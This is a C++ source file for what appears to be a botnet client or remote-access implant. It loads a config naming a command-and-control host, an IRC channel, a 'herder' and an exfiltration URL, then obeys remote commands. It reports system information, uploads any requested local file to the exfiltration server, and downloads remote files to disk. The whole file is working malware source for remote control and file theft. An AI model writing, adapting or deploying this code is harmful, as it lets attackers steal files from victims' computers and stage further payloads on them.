#include "Environment.hpp"
#include "SecureSocket.hpp"
#include "Utils.hpp"
#include "SystemInfo.hpp"
#include "DataLoader.hpp"
#include "Lib/json.hpp"
#include "HttpClient.hpp"
#include "HttpUtils.hpp"
#include "Processes.hpp"
#include "Channels.hpp"
#include <thread>
#include <fstream>

using namespace Legit;
using json = nlohmann::json;
using namespace std;

unique_ptr<ISocket> SocketFactory(string scheme, string host, string port)
{
    if (scheme == "http://")
        return make_unique<Socket>(host, port == "" ? "80" : port);
    else if (scheme == "https://")
        return make_unique<SecureSocket>(host, port == "" ? "443" : port, make_unique<CertStore>());
    else
        return nullptr;
}

void MainThread(unsigned int parentThreadId)
{
    string configPath = Processes::GetExecutablePath() + Legit::SEPARATOR + "config.json";

    cout << "Loading config from " << configPath << " ... ";

    json config;
    ifstream configFile(configPath, ios::in);
    configFile >> config;

    string type = config["type"];
    string host = config["host"];
    string port = config["port"];
    string channel = config["channel"];
    string herder = config["herder"];
    string exfil = config["exfil"];

    auto exfilUrlParts = HttpUtils::SplitUrl(exfil);
    string exfilScheme = exfilUrlParts[0];
    string exfilHost = exfilUrlParts[1];
    string exfilPort = exfilUrlParts[2];
    string exfilPath = exfilUrlParts[3];

    cout << "Done" << endl;

    string certPath = Processes::GetExecutablePath() + Legit::SEPARATOR + "cc.cer";
    cout << "Loading cert from " << certPath << " ... ";
    vector<char> pemBytes;
    DataLoader::LoadFromFile(Utils::WideFromString(certPath), pemBytes);
    string cert(pemBytes.begin(), pemBytes.end());

    cout << "Done" << endl;
    cout << "Creating channel of type '" << type << "' ... ";

    unique_ptr<ICommandChannel> cc = nullptr;
    if (type == "irc")
        cc = make_unique<IrcCommandChannel>(host, port, channel, herder, cert);
    else if (type == "custom")
        cc = make_unique<CustomCommandChannel>(host, port, cert);

    string nick = cc->GetName();
    cout << "Done" << endl;

    while (true)
    {
        auto message = cc->Receive();
        if (message == "quit")
        {
            #ifdef _WIN32
            ::PostThreadMessage(parentThreadId, WM_QUIT, 0, 0);
            #endif
            break;
        }
        else if (message == "info")
        {
            SystemInfo info;
            cc->Send(Utils::StringFromWide(info.GetPlatform()) + " | " + Utils::StringFromWide(info.GetVersion()));
        }
        else if (message.substr(0, 7) == "upload ")
        {
            // Load file from disk
            wstring path = Utils::WideFromString(message.substr(7));
            vector<char> fileContents;
            
            if (DataLoader::LoadFromFile(path, fileContents))
            {
                string narrowPath = Utils::StringFromWide(path);
                auto filenameParts = Utils::Split(narrowPath, string(1, Legit::SEPARATOR));

                // Dump it out to exfil
                string boundary;
                unordered_map<string, string> fields;
                unordered_map<string, HttpFile> files;
                files.insert(make_pair("f0", HttpFile(filenameParts.back(), fileContents)));

                auto body = HttpUtils::CreateBody(fields, files, boundary);
                HttpClient client(SocketFactory(exfilScheme, exfilHost, exfilPort));
                auto response = client.Post(exfilPath + "?c=" + nick, body, "multipart/form-data; boundary=" + boundary);

                cc->Send("Done (" + response.statusCode + ")");
            }
            else
            {
                cc->Send("Fail (couldn't load local file)");
            }
        }
        else if (message.substr(0, 9) == "download ")
        {
            string url = message.substr(9);
            auto urlParts = HttpUtils::SplitUrl(url);
            HttpClient client(SocketFactory(urlParts[0], urlParts[1], urlParts[2]));

            auto response = client.Get(urlParts[3]);
            
            string path = Processes::GetExecutablePath() + Legit::SEPARATOR + "test.bin";
            DataLoader::DumpToFile(Utils::WideFromString(path), response.body);

            ostringstream ss;
            ss << Utils::FriendlySize(response.body.size()) << " downloaded to " << path;
            cc->Send(ss.str());
        }
        else if (message == "hello")
        {
            cc->Send("hello");
        }
    }
}

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE instance, HINSTANCE prevInstance, LPSTR commandLine, int show)
{
    auto foo = Processes::GetCurrentProcesses();

    DWORD threadId = ::GetCurrentThreadId();
    thread t(MainThread, threadId);

    MSG message;
    while (::GetMessage(&message, nullptr, 0, 0) != 0)
    {
        if (message.message == WM_QUIT)
            break;

        ::TranslateMessage(&message);
        ::DispatchMessage(&message);
    }

    t.join();

    Socket::Shutdown();

    return 0;
}
#else
int main(int argc, char **argv)
{
    MainThread(0);

    return 0;
}
#endif

